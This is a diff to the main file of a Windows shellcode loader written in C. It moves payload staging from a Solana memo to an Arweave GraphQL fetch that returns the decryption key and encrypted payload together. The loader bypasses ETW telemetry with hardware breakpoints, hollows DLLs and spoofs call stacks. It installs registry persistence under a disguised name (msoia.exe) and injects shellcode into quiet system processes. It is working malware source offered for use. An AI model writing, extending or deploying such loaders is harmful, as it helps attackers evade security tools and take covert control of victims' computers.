@@ -1,7 +1,7 @@
 // =============================================
 // main.c - Shellcode Loader
 //
-// Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
+// Evasion:  Patchless ETW (VEH + HW breakpoints)
 // Memory:   Phantom DLL Hollowing -> Module Stomp -> NtAllocateVirtualMemory
 // Thread:   Thread pool callback (TpAllocWork/TpPostWork)
 // Stack:    Call gadget injection + tail-call spoofing
@@ -12,10 +12,11 @@
 
 #include "Common.h"
 
-// NOTE: No static encoded URL or key data — both live on-chain.
-// FetchSolMemo() in Solana.c queries the Solana JSON-RPC API at runtime
-// to retrieve the staging URL + Chaskey key/nonce from the beacon wallet's
-// oldest transaction memo.  Only the wallet address is compiled in (Payload.h).
+// NOTE: No static URL or key data in the binary.
+// FetchArweaveMeta() in Arweave.c queries arweave.net/graphql for the newest
+// confirmed zero-loader TX from the wallet in Payload.h, downloads the TX data,
+// and parses the combined header (hex_key|hex_nonce|size|compressed|<binary>).
+// The encrypted payload bytes are returned directly — no second HTTP call.
 
 // -----------------------------------------------
 // Entry Point
@@ -71,10 +72,10 @@ int Main(VOID) {
     LPCSTR preload[] = { (LPCSTR)xAmsi, (LPCSTR)xWininet, (LPCSTR)xKtm };
     ShufflePreloadLibraries(&WinApis, preload, 3);
 
-    // --- Patchless AMSI/ETW bypass ---
-    // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
-    // NtContinue sets DR0/DR1 without ETW-TI telemetry
-    PatchlessAmsiEtw(&WinApis);
+    // --- Patchless ETW bypass ---
+    // VEH + hardware breakpoint on EtwEventWrite (DR0)
+    // NtContinue sets DR0 without ETW-TI telemetry
+    PatchlessEtw(&WinApis);
 
     // --- UAC bypass + self-install (UAC builds only) ---
     // Two-process AppInfo RPC bypass (no manifest, no UAC dialog):
@@ -89,41 +90,42 @@ int Main(VOID) {
     }
 #endif
 
-    // --- Resolve URL + key + nonce from Solana beacon ---
-    // FetchSolMemo queries api.mainnet-beta.solana.com (or the custom RPC host
-    // encoded in Payload.h) for the wallet's oldest transaction, reads the SPL
-    // Memo, and parses: <url>|<32-hex-key>|<24-hex-nonce>.
-    // No URL or crypto key is embedded anywhere in this binary.
-    PCHAR pStagingUrl   = NULL;
+    // --- Install (non-UAC builds only) ---
+    // Must run BEFORE download — on first run the process terminates here,
+    // so no network activity happens on the initial execution.
+    //
+    // EXE first run:  InstallAndTerminate: self-guard fails → InstallPersistence (HKCU key)
+    //                 → copy + CreateProcessW(msoia.exe) + NtTerminateProcess
+    // EXE reboot:     InstallAndTerminate: self-guard fires (basename == msoia.exe) → return
+    //                 → fall through to download (no persistence re-write)
+    //
+    // Sideload first run: SideloadInstallAndContinue: self-guard fails (no /pf)
+    //                     → InstallPersistence (HKCU key) → copy + CreateProcessW(msoia.exe /pf) + NtTerminateProcess
+    // Sideload reboot:    SideloadInstallAndContinue: self-guard fires (/pf) → return
+    //                     → fall through to download (no persistence re-write)
+#ifndef UAC_BYPASS
+#ifndef BUILD_DLL
+    InstallAndTerminate(&WinApis);
+#else
+    SideloadInstallAndContinue(&WinApis);
+#endif
+#endif
+
+    // --- Resolve beacon + download payload in one step ---
+    // FetchArweaveMeta queries arweave.net/graphql for the newest confirmed
+    // zero-loader TX from the wallet in Payload.h, downloads the TX data, and
+    // parses the combined header (hex_key|hex_nonce|size|compressed|<binary>).
+    // The encrypted payload bytes come back directly — no second HTTP call.
+    PBYTE pPayload      = NULL;
+    DWORD dwPayloadSize = 0;
     BYTE  aKey[KEY_SIZE] = { 0 };
     BYTE  aNonce[12]     = { 0 };
     DWORD dwOrigSize    = 0;
     BOOL  bCompressed   = FALSE;
 
-    LOG("[*] Resolving beacon from Solana...");
-    if (!FetchSolMemo(&WinApis, &pStagingUrl, aKey, aNonce, &dwOrigSize, &bCompressed))
+    LOG("[*] Resolving beacon and downloading payload from Arweave...");
+    if (!FetchArweaveMeta(&WinApis, &pPayload, &dwPayloadSize, aKey, aNonce, &dwOrigSize, &bCompressed))
         return 0;
-
-    // --- Download encrypted payload ---
-    PBYTE pPayload      = NULL;
-    DWORD dwPayloadSize = 0;
-
-    LOG("[*] Downloading payload...");
-    if (!DownloadPayload(&WinApis, pStagingUrl, &pPayload, &dwPayloadSize)) {
-        MemSet(aKey,   0, KEY_SIZE);
-        MemSet(aNonce, 0, sizeof(aNonce));
-        SIZE_T urlLen = StrLenA(pStagingUrl);
-        MemSet(pStagingUrl, 0, urlLen);
-        HeapFree(GetProcessHeap(), 0, pStagingUrl);
-        return 0;
-    }
-    // Wipe URL immediately — it was only needed for the download
-    {
-        SIZE_T urlLen = StrLenA(pStagingUrl);
-        MemSet(pStagingUrl, 0, urlLen);
-        HeapFree(GetProcessHeap(), 0, pStagingUrl);
-        pStagingUrl = NULL;
-    }
     LOG("[+] Payload loaded");
 
     // --- Decrypt with Chaskey-CTR ---
@@ -264,6 +266,39 @@ int Main(VOID) {
     MemSet(pShellcode, 0, dwShellcodeSize);
     HeapFree(GetProcessHeap(), 0, pShellcode);
 
+#ifdef BUILD_DLL
+    // --- Persistence-reboot: inject into low-CPU process, terminate host ---
+    // On first run SideloadInstallAndContinue terminates us before we reach this
+    // point. On reboot the host EXE is relaunched with /pf, meaning we are running
+    // inside that host EXE which may consume ~25% CPU on its own. Injecting into
+    // a near-idle system process (RuntimeBroker etc.) and exiting drops overhead
+    // to ~1% with no loss of shellcode execution.
+    {
+        PVOID pCmdK32 = FindLoadedModuleW(L"KERNEL32.DLL");
+        typedef LPCSTR (WINAPI* fnGCLA)(VOID);
+        fnGCLA pGetCmdLine = pCmdK32
+            ? (fnGCLA)FetchExportAddress(pCmdK32, GetCommandLineA_JOAAT) : NULL;
+        LPCSTR szCmd = pGetCmdLine ? pGetCmdLine() : NULL;
+        BOOL bPfFlag = FALSE;
+        if (szCmd) {
+            for (DWORD _ci = 0; szCmd[_ci]; _ci++) {
+                if (szCmd[_ci  ] == ' '  && szCmd[_ci+1] == '/' &&
+                    szCmd[_ci+2] == 'p'  && szCmd[_ci+3] == 'f' &&
+                    (szCmd[_ci+4] == '\0' || szCmd[_ci+4] == ' ')) {
+                    bPfFlag = TRUE; break;
+                }
+            }
+        }
+        if (bPfFlag) {
+            // pExec is RX-mapped in the current process — readable as source for
+            // NtWriteVirtualMemory. InjectAndHijack terminates us on success;
+            // falls through (returns FALSE) if no suitable target is found so the
+            // thread-pool path below runs as fallback (host EXE stays alive).
+            InjectAndHijack(pExec, dwShellcodeSize);
+        }
+    }
+#endif
+
     // ============================================================
     // Cleanup: Remove evasion artifacts before shellcode runs
     //
@@ -274,13 +309,6 @@ int Main(VOID) {
 
     CleanupEvasion(&WinApis);
     LOG("[+] Evasion cleanup complete");
-
-    // --- Install persistence (non-UAC builds only) ---
-    // UAC builds persist via InstallAndTerminate above (called before shellcode load).
-#ifndef UAC_BYPASS
-    InstallPersistence(&WinApis);
-    LOG("[+] Persistence installed");
-#endif
 
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
